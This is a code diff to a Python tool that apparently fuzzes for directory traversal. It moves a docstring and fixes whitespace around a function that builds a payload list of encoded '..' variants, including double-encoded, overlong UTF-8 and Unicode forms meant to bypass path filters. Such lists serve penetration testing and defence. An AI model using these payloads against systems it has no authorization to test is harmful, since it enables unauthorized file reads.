@@ -22,8 +22,10 @@ import sys
 import os
 
 
-"""generate payload list from a variety of dots and slashes"""
 def generatePayloads():
+    """
+    generate payload list from a variety of dots and slashes
+    """
     dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae',
             '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae',
             '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
@@ -68,7 +70,7 @@ stable = False
 
 # clear the terminal, supports both Windows and Unix-like
 CLEAR_CMD = ["cmd", "/c", "cls"] if sys.platform.lower().startswith("win") else ["clear"]
- 
+
 # set maximal amount of processes
 processes = multiprocessing.cpu_count()
 
